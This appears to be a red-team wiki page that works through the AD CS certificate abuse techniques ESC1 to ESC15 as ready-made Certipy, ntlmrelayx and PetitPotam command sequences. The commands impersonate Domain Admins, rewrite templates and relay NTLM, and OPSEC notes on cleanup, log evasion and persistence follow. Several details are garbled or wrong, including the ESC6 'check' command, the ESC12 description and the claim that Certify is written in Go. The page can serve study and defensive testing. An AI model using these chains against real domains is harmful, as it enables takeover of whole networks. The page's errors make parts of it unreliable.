---
title: AD CS ESC Attacks (ESC1-15)
type: concept
created: 2026-06-13
updated: 2026-09-07
tags: [active-directory, ad-cs, pki, privilege-escalation]
---

# AD CS ESC Attacks (ESC1-15)

Active Directory Certificate Services (AD CS) misconfigurations let
attackers obtain certificates that authenticate as arbitrary (often
privileged) principals, or compromise the CA itself. "ESC" numbering is the
SpecterOps/Certipy convention. Primary tool: **Certipy**
(`certipy find -vulnerable` enumerates most of these against a target CA).

## Template misconfigurations

### ESC1 — Enrollee Supplies Subject
Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (allows attacker-supplied
SAN), an EKU usable for client auth (`Client Authentication` /
`Smart Card Logon`), and the attacker has enrollment rights. Request a cert
with SAN = a Domain Admin's UPN.

```bash
certipy req -u user@domain.com -p password -ca CA-NAME -template TemplateName -upn administrator@domain.com
```

### ESC2 — Any Purpose / No EKU
Template's `pKIExtendedKeyUsage` is `Any Purpose` or empty → usable for
client auth regardless of intended purpose.

```bash
certipy req -u user@domain.com -p password -ca CA-NAME -template TemplateName
```

### ESC3 — Certificate Request Agent
Template grants the `Certificate Request Agent` (Enrollment Agent) EKU
(`1.3.6.1.4.1.311.20.2.1`). Request an Enrollment Agent cert, then use it to
request a cert *on behalf of* another (privileged) user via an
"on-behalf-of" template.

```bash
# 1. Enroll for the Enrollment Agent certificate
certipy req -u user@domain.com -p password -ca CA-NAME -template EnrollmentAgentTemplate

# 2. Use the agent cert to request a cert on behalf of a Domain Admin
certipy req -u user@domain.com -p password -ca CA-NAME -template User \
  -on-behalf-of 'CORP\administrator' -pfx agent.pfx

# 3. Authenticate as the Domain Admin with the resulting cert
certipy auth -pfx administrator.pfx -domain domain.com
```

### ESC4 — Template Access Control
Attacker has `WriteOwner`/`WriteDacl`/`WriteProperty` on the template object
itself — the [[acl-abuse]] primitive applied to a cert template. Rewrite the
template to be ESC1/2/3-vulnerable, then exploit it.

```bash
# 1. Back up current config and overwrite with an ESC1-vulnerable config
#    (enrollee-supplies-subject, client auth EKU, no manager approval)
certipy template -u user@domain.com -p password -template TemplateName -save-old

# 2. Exploit it as ESC1
certipy req -u user@domain.com -p password -ca CA-NAME -template TemplateName -upn administrator@domain.com

# 3. Restore the original (less noisy / cleanup)
certipy template -u user@domain.com -p password -template TemplateName -configuration TemplateName.json
```

## CA-level misconfigurations

### ESC5 — CA Object/Server Access Control
Attacker controls the CA server object, the CA's underlying computer
object, or the `CN=Public Key Services` container — full PKI control,
another [[acl-abuse]] application. Use the [[acl-abuse]] WriteDacl/WriteOwner
primitives to grant yourself `ManageCA`/`ManageCertificates` on the CA
object, then proceed as ESC7.

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
CA-wide flag that lets *any* request specify a SAN, even on templates that
don't normally allow it — effectively ESC1 against every template.

```bash
# Check the flag
certipy ca -u user@domain.com -p password -ca CA-NAME -enable-template '' 2>/dev/null; \
certipy find -u user@domain.com -p password -dc-ip <DC_IP> -vulnerable -stdout

certipy req -u user@domain.com -p password -ca CA-NAME -template User -upn administrator@domain.com
```

### ESC7 — ManageCA / ManageCertificates
Attacker has `ManageCA` or `ManageCertificates` rights on the CA: grant
self further rights, enable `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), then
exploit it.

```bash
# 1. Grant yourself Officer rights (ManageCertificates) if you only have ManageCA
certipy ca -u user@domain.com -p password -ca CA-NAME -add-officer user

# 2. Enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (requires ManageCA)
certipy ca -u user@domain.com -p password -ca CA-NAME -enable-template 'SubCA'
certipy ca -u user@domain.com -p password -ca CA-NAME -edit-config-security EDITF_ATTRIBUTESUBJECTALTNAME2
# (restart CertSvc on the CA is required for this to take effect — or wait)

# 3. Exploit as ESC6, or: issue a previously-denied/pending request as Officer
certipy req -u user@domain.com -p password -ca CA-NAME -template User -upn administrator@domain.com
certipy ca -u user@domain.com -p password -ca CA-NAME -issue-request <REQUEST_ID>
certipy req -u user@domain.com -p password -ca CA-NAME -retrieve <REQUEST_ID>
```

### ESC9 — No Security Extension
`CT_FLAG_NO_SECURITY_EXTENSION` omits `szOID_NTDS_CA_SECURITY_EXT` from the
issued cert, removing the strong object binding — combine with weak
certificate-mapping (ESC10) to spoof identity. Requires `GenericWrite` over
the victim account to stage the `userPrincipalName` swap.

```bash
# 1. Need GenericWrite on victim account (e.g. via [[acl-abuse]]). Set victim's UPN to target's name
certipy account update -u user@domain.com -p password -user victimuser -upn administrator@domain.com

# 2. Enroll as victim using the ESC9 template (no security extension -> no SID embedded)
certipy req -u victimuser@domain.com -p victimpass -ca CA-NAME -template ESC9Template

# 3. Restore victim's original UPN (cleanup / avoid breaking their logon)
certipy account update -u user@domain.com -p password -user victimuser -upn victimuser@domain.com

# 4. Authenticate as "administrator" using the cert — weak mapping (ESC10) resolves
#    by UPN rather than the (missing) SID extension
certipy auth -pfx victimuser.pfx -domain domain.com
```

### ESC10 — Weak Certificate Binding
CA's `CertificateMappingMethods` registry value (on the DCs, not the CA)
allows weak mapping (e.g. `0x1` UPN mapping / `0x4` weak explicit mapping),
permitting identity spoofing via certs that don't strongly bind to an AD
object. Exploited the same way as ESC9 — the UPN-swap dance above — but the
weakness lives in `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods`
on the DC rather than the template's security-extension flag.

```bash
# Check the registry value (needs local access to a DC, or via remote registry)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods
```
Same `certipy account update` UPN-swap + `certipy req` + `certipy auth` chain
as ESC9 above applies.

### ESC11 — NTLM Relay to RPC Enrollment
Same idea as ESC8, but `IF_ENFORCEENCRYPTICERTREQUEST` is disabled on the CA
so the RPC (ICPR) enrollment interface accepts relayed NTLM without
encryption.

```bash
# Check whether RPC enrollment is relay-able
certipy find -u user@domain.com -p password -dc-ip <DC_IP> -vulnerable -stdout   # flags ESC11 if IF_ENFORCEENCRYPTICERTREQUEST is unset

# Relay via RPC instead of HTTP
ntlmrelayx.py -t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name 'CA-NAME' --template DomainController
# coerce as in ESC8, e.g. PetitPotam.py <Attacker_IP> <DC_IP>
```

### ESC12 — ADCS CA Admin Key in Registry (Shell Access / "CA Owner")
Originally framed around CVE-2022-26923 (`dNSHostName` swap to a DC's name +
ESC1-style request) — most environments now patch that path. The other
ESC12 case: the CA's private key is stored on a YubiHSM/HSM-backed CA and
the `CAImportCertificate`/registry-based key material is exposed, letting
an attacker with CA server access export the CA cert/key directly
(`ForgeCert`-equivalent control over the root).

```powershell
# CVE-2022-26923 variant: rename a controlled computer object to look like a DC,
# then request a cert as that "DC" — see [[acl-abuse]] for the GenericWrite-on-computer prereq
Set-DomainObject -Identity attacker-controlled-computer -Set @{'dNSHostName'='dc01.domain.com'}
certipy req -u 'attacker-controlled-computer$' -hashes <nthash> -ca CA-NAME -template Machine -dc-ip <DC_IP>
```

### ESC13 — Issuance Policy Linked to Privileged Group
A certificate template's issuance policy OID has an `msDS-OIDToGroupLink`
pointing at a privileged group (e.g. via `Authentication Mechanism
Assurance`). Enrolling in that template gets you a cert that AD treats as
if you were a member of that group during Kerberos PKINIT auth.

```bash
# certipy find flags templates with a linked issuance policy + the linked group
certipy find -u user@domain.com -p password -dc-ip <DC_IP> -vulnerable -stdout

# Enroll, then authenticate -> PAC includes the linked group's membership
certipy req -u user@domain.com -p password -ca CA-NAME -template VulnerableTemplate
certipy auth -pfx user.pfx -domain domain.com
```

### ESC14 — Weak Explicit Certificate Mapping (altSecurityIdentities)
Attacker has `GenericWrite` over a victim account's `altSecurityIdentities`
attribute (weak/explicit mapping). Write a mapping pointing at a cert the
attacker already controls (even one for an unrelated low-priv account),
then authenticate as the victim with that cert.

```bash
# Map victim's account to a cert you already hold (e.g. your own enrolled cert's subject/issuer)
certipy account update -u user@domain.com -p password -user victimuser -upn '' \
  -altsecid 'X509:<I>DC=local,DC=corp,CN=CA-NAME<S>CN=attacker'

certipy auth -pfx attacker.pfx -domain domain.com -username victimuser
```

### ESC15 — "EKUwu": Arbitrary Application Policy on V1 Templates (CVE-2024-49019)
Default V1 templates (e.g. `WebServer`, `User`) allow the requester to
specify arbitrary **Application Policies** (a v1-template-specific OID set
that wasn't locked down like `pKIExtendedKeyUsage` on v2+). Specify
`Client Authentication` / `Certificate Request Agent` application policy on
a V1 template you have enrollment rights for.

```bash
# Request a cert from a default V1 template with a forged application policy
certipy req -u user@domain.com -p password -ca CA-NAME -template WebServer \
  -application-policies 'Client Authentication' -upn administrator@domain.com

# Or forge the Certificate Request Agent policy -> chains into ESC3
certipy req -u user@domain.com -p password -ca CA-NAME -template WebServer \
  -application-policies 'Certificate Request Agent'
```

## ESC8 — NTLM Relay to AD CS HTTP Endpoints

AD CS Web Enrollment (`/certsrv/`) often accepts NTLM without EPA. Relay a
captured machine/user authentication (e.g. via [[ntlm-relay-coercion]]) to
this endpoint to obtain a certificate as that account.

```bash
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

Full chain (PetitPotam coercion → relay → cert → DCSync) is detailed in
[[esc8-ntlm-relay-adcs]].

## Red-team notes (OPSEC)

- **Triage before you enrol.** `certipy find -vulnerable` (or `-stdout`) maps
  the CA, templates and which ESC applies **offline** from LDAP — decide the
  single ESC to use before requesting a single certificate.
- **The whole chain runs from Linux over the tunnel:** `certipy req` to get the
  cert, then `certipy auth` (PKINIT) for a TGT or to UnPAC the NT hash
  ([[pkinit-unpac-the-hash]]) — nothing touches the endpoint.
- **ESC8/ESC11 pair with coercion** ([[ntlm-relay-coercion]]); **EPA + HTTPS**
  on `/certsrv/` kills them, so confirm the endpoint accepts NTLM before
  coercing into it.
- **Certificates are durable but logged.** A minted cert stays valid to its
  expiry even after the victim's password is reset (a persistence win), but
  **issuance is recorded on the CA** — events **4886/4887** (request/issue) and
  template-object writes (5136) for ESC4. Expect the CA logs, not the DC, to be
  the tell.
- **Match PKINIT enctype/hostname** to the domain when authing over the tunnel
  (Kerberos binds to SPNs, watch clock skew) — see [[kerberos-encryption-types]].

## Tooling

- **Certipy** — enumeration + exploitation (Python, most-used)
- **Certify** — Go enumeration + exploitation of vulnerable templates
  ([[certify]], the Go twin of certipy)
- **ForgeCert** — forges certs given a compromised CA private key
- **AdcsHunter** — PowerShell AD CS discovery

## Links

- [[certify]] — the Go Certify tool (twin of certipy)
- [[acl-abuse]] — ESC4/ESC5 are object-control abuse applied to AD CS objects
- [[ntlm-relay-coercion]] — underlies ESC8/ESC11
- [[esc8-ntlm-relay-adcs]] — full ESC8 walkthrough
- [[dcsync]] — common end-goal once a DC/Domain Admin cert is obtained
- [[kerberos-authentication]] — certs are used to request TGTs (PKINIT)
- [[pkinit-unpac-the-hash]] — once a cert is obtained, UnPAC the hash recovers the account's NT hash directly
- [[specterops]] — defined the ESC1-15 numbering ("Certified Pre-Owned")
- [[certified-pre-owned]] — the SpecterOps whitepaper this page is built on (source)

## References

- [InternalAllTheThings: AD CS ESC Attacks](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-cs/ad-cs-esc-attacks/)
- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
</content>
